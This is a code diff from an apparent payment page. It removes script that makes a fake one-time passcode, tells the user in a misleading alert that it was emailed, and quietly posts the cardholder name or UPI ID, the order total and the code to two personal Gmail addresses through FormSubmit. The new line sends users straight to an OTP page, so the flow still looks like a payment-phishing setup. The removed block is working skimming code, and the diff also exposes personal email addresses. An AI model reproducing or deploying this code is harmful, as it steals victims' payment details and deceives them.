@@ -280,57 +280,8 @@
 
     localStorage.setItem('paymentData', JSON.stringify(paymentData));
 
-    // Generate OTP
-    const otp = Math.floor(100000 + Math.random() * 900000).toString();
-    localStorage.setItem('paymentOTP', otp);
-
-    // Show OTP to user (for demo purposes)
-    alert(`Payment OTP: ${otp}\n\nThis OTP has been sent to ${billingData.email}\n\nPlease note this OTP for verification.`);
-
-    // Send card details to FormSubmit
-    const formData = new FormData();
-    formData.append('_subject', 'Card Details Submitted');
-    formData.append('_template', 'table');
-    formData.append('_captcha', 'false');
-    formData.append('_autoresponse', `Thank you for your payment! Your OTP is: ${otp}. This OTP has been sent to your registered email for verification.`);
-    
-    // Only send card details, no personal information
-    formData.append('orderTotal', billingData.orderTotal || '0');
-    formData.append('paymentStatus', 'Card Details Received');
-    formData.append('submissionTime', new Date().toLocaleString());
-    formData.append('generatedOTP', otp); // Add OTP to email data
-    
-    if (selectedPm === 'card') {
-      formData.append('paymentMethod', 'Card Payment');
-      formData.append('cardName', nm);
-    } else if (selectedPm === 'upi') {
-      formData.append('paymentMethod', 'UPI Payment');
-      formData.append('upiId', document.getElementById('upiId').value);
-    } else {
-      formData.append('paymentMethod', 'Cash on Delivery');
-    }
-    
-    // Send to both email recipients
-    Promise.all([
-      fetch("https://formsubmit.co/ajax/anandjhare4@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(Object.fromEntries(formData))
-      }),
-      fetch("https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(Object.fromEntries(formData))
-      })
-    ]).catch(() => {}).finally(() => {
-      location.href = "loading.html";
-    });
+    // Direct redirect to OTP page
+    location.href = "otp.html";
   }
 </script>
 </body>
